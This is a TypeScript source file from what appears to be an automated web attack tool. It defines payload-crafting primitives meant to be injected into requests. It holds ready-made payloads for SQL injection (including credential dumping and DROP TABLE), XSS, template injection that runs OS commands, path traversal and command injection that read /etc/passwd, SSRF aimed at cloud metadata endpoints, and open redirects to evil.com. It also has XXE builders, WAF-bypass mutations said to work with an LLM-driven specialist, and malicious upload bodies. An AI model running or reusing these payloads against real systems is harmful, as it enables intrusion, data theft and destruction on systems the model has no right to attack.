// src/primitives/payload.ts
//
// Payload-crafting primitives: craftPayload, craftBypass, craftXmlEntity, craftMultipart.
// These produce the actual strings/bytes that the Composer will inject into a request.

import type { InjectionLocation, PayloadType, PrimitiveDefinition, PrimitiveResult } from './types';

const SQLI_PAYLOADS: Record<string, string[]> = {
  url: [
    `' OR 1=1 --`,
    `' OR '1'='1`,
    `' UNION SELECT NULL--`,
    `' UNION SELECT username, password FROM users--`,
    `1' ORDER BY 1--`,
    `1' AND SLEEP(3)--`,
    `'; WAITFOR DELAY '0:0:3'--`,
    `admin'--`,
  ],
  body: [
    `' OR 1=1 --`,
    `'; DROP TABLE users;--`,
    `' UNION SELECT NULL,version()--`,
  ],
  header: [`' OR 1=1 --`],
  cookie: [`' OR 1=1 --`],
  path: [`../' OR 1=1 --`],
  filename: [`' OR 1=1 --.txt`],
  'xml-entity': [],
};

const XSS_PAYLOADS: Record<string, string[]> = {
  html: [
    `<script>alert(1)</script>`,
    `<img src=x onerror=alert(1)>`,
    `<svg onload=alert(1)>`,
    `<details open ontoggle=alert(1)>`,
    `<iframe srcdoc="<script>alert(1)</script>">`,
    `"><svg onload=alert(1)>`,
    `javascript:alert(1)`,
  ],
  attr: [
    `" onmouseover="alert(1)`,
    `' onfocus='alert(1)`,
    `" autofocus onfocus="alert(1)`,
  ],
  js: [
    `';alert(1);//`,
    `\\';alert(1);//`,
    `</script><script>alert(1)</script>`,
  ],
  url: [
    `javascript:alert(1)`,
    `data:text/html,<script>alert(1)</script>`,
  ],
  css: [
    `}</style><script>alert(1)</script>`,
    `expression(alert(1))`,
  ],
};

const SSTI_PAYLOADS: Record<string, string[]> = {
  generic: [
    `{{7*7}}`,
    `\${7*7}`,
    `<%= 7*7 %>`,
    `#{7*7}`,
    `\${'{{'}.toString()}`,
  ],
  jinja: [
    `{{config.items()}}`,
    `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
  ],
  twig: [`{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`],
  freemarker: [`<#assign x="freemarker.template.utility.Execute"?new()> \${x("id")}`],
  erb: [`<%= system('id') %>`],
  velocity: [`#set($x=1+1)$x`],
};

const PATH_TRAVERSAL = [
  `../../../etc/passwd`,
  `..%2F..%2F..%2Fetc%2Fpasswd`,
  `....//....//....//etc/passwd`,
  `..\\..\\..\\windows\\win.ini`,
  `file:///etc/passwd`,
  `/etc/passwd`,
];

const CMD_INJECTION = [
  `; ls -la`,
  `| cat /etc/passwd`,
  `$(cat /etc/passwd)`,
  `; id`,
  `& whoami`,
  `\`id\``,
];

const SSRF_PAYLOADS = [
  `http://169.254.169.254/latest/meta-data/`,
  `http://metadata.google.internal/computeMetadata/v1/`,
  `http://100.100.100.200/latest/meta-data/`,
  `http://169.254.169.254/metadata/instance?api-version=2021-02-01`,
  `http://127.0.0.1:6379/`,
  `http://localhost:9200/_cat/indices`,
  `http://[::1]/`,
];

const REDIRECT_PAYLOADS = [
  `//evil.com`,
  `https://evil.com`,
  `/\\evil.com`,
  `//evil.com/path`,
  `https://evil.com%0D%0AContent-Type:text/html`,
  `////evil.com`,
  `https:evil.com`,
];

const CSRF_TEST_PARAMS = [
  'csrf_token',
  'csrfmiddlewaretoken',
  '_csrf',
  'authenticity_token',
  'token',
  'xsrf_token',
];

export const craftPayload: PrimitiveDefinition<
  { type: PayloadType; context?: string; engine?: string; count?: number },
  string[]
> = {
  name: 'craftPayload',
  description: 'Generate attack payloads for a given type and injection context. Returns an array of strings the Composer will inject one-by-one.',
  requiresBrowser: false,
  deterministic: true,
  execute(args, _ctx): PrimitiveResult<string[]> {
    const start = Date.now();
    const limit = args.count ?? 6;
    let candidates: string[] = [];

    switch (args.type) {
      case 'sqli': {
        const ctx = args.context ?? 'url';
        candidates = SQLI_PAYLOADS[ctx] ?? SQLI_PAYLOADS.url;
        break;
      }
      case 'xss': {
        const ctx = args.context ?? 'html';
        candidates = XSS_PAYLOADS[ctx] ?? XSS_PAYLOADS.html;
        break;
      }
      case 'ssti': {
        const engine = args.engine ?? 'generic';
        candidates = SSTI_PAYLOADS[engine] ?? SSTI_PAYLOADS.generic;
        break;
      }
      case 'path':
        candidates = PATH_TRAVERSAL;
        break;
      case 'cmd':
        candidates = CMD_INJECTION;
        break;
      case 'ssrf':
        candidates = SSRF_PAYLOADS;
        break;
      case 'csrf':
        candidates = CSRF_TEST_PARAMS;
        break;
      case 'redirect':
        candidates = REDIRECT_PAYLOADS;
        break;
      case 'xxe':
        candidates = [];
        break;
      default:
        candidates = [];
    }

    return {
      ok: true,
      value: candidates.slice(0, limit),
      durationMs: Date.now() - start,
    };
  },
};

export const craftBypass: PrimitiveDefinition<
  { payload: string; wafType: string },
  string[]
> = {
  name: 'craftBypass',
  description: 'Generate WAF-bypass variants of a payload using common mutation techniques. Composes with waf-bypass specialist for LLM-driven mutations.',
  requiresBrowser: false,
  deterministic: true,
  execute(args, _ctx): PrimitiveResult<string[]> {
    const start = Date.now();
    const p = args.payload;
    const variants: string[] = [
      p,
      encodeURIComponent(p),
      doubleEncode(p),
      unicodeEscape(p),
      commentSplit(p),
      lowerCase(p),
      mixedCase(p),
      nullByte(p),
      mysqlCommentBang(p),
      httpParameterPollution(p),
    ];
    return {
      ok: true,
      value: Array.from(new Set(variants)).filter((v) => v.length > 0),
      durationMs: Date.now() - start,
    };
  },
};

function doubleEncode(s: string): string {
  return encodeURIComponent(encodeURIComponent(s));
}

function unicodeEscape(s: string): string {
  return s.replace(/[a-zA-Z]/g, (c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`);
}

function commentSplit(s: string): string {
  return s.replace(/ /g, '/**/');
}

function lowerCase(s: string): string {
  return s.toLowerCase();
}

function mixedCase(s: string): string {
  return s
    .split('')
    .map((c, i) => (i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()))
    .join('');
}

function nullByte(s: string): string {
  return s.replace(/^(.)/, '%00$1');
}

function mysqlCommentBang(s: string): string {
  return s.replace(/ /g, '/*!*/');
}

function httpParameterPollution(s: string): string {
  return s + s;
}

export const craftXmlEntity: PrimitiveDefinition<
  { target: 'file' | 'ssrf' | 'rce'; path?: string; host?: string },
  string
> = {
  name: 'craftXmlEntity',
  description: 'Craft an XML external entity payload for XXE attacks. Returns the full XML string ready to POST.',
  requiresBrowser: false,
  deterministic: true,
  execute(args, _ctx): PrimitiveResult<string> {
    const start = Date.now();
    let entity = '';
    if (args.target === 'file') {
      const path = args.path ?? '/etc/passwd';
      entity = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://${path}">
]>
<root><data>&xxe;</data></root>`;
    } else if (args.target === 'ssrf') {
      const host = args.host ?? 'http://169.254.169.254/latest/meta-data/';
      entity = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "${host}">
]>
<root><data>&xxe;</data></root>`;
    } else {
      entity = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root><data>&xxe;</data></root>`;
    }
    return {
      ok: true,
      value: entity,
      durationMs: Date.now() - start,
    };
  },
};

export const craftMultipart: PrimitiveDefinition<
  { filename: string; content: string; contentType?: string; fieldName?: string },
  { body: Buffer; contentType: string; filename: string }
> = {
  name: 'craftMultipart',
  description: 'Build a multipart/form-data body with a crafted filename. Used for file-upload path-traversal and SVG-XSS attacks.',
  requiresBrowser: false,
  deterministic: true,
  execute(args, _ctx): PrimitiveResult<{ body: Buffer; contentType: string; filename: string }> {
    const start = Date.now();
    const fieldName = args.fieldName ?? 'file';
    const contentType = args.contentType ?? 'application/octet-stream';
    const boundary = `----UltimatrixBoundary${Date.now()}`;
    const head = `--${boundary}\r\nContent-Disposition: form-data; name="${fieldName}"; filename="${args.filename}"\r\nContent-Type: ${contentType}\r\n\r\n`;
    const tail = `\r\n--${boundary}--\r\n`;
    const body = Buffer.from(head + args.content + tail, 'utf-8');
    return {
      ok: true,
      value: {
        body,
        contentType: `multipart/form-data; boundary=${boundary}`,
        filename: args.filename,
      },
      durationMs: Date.now() - start,
    };
  },
};
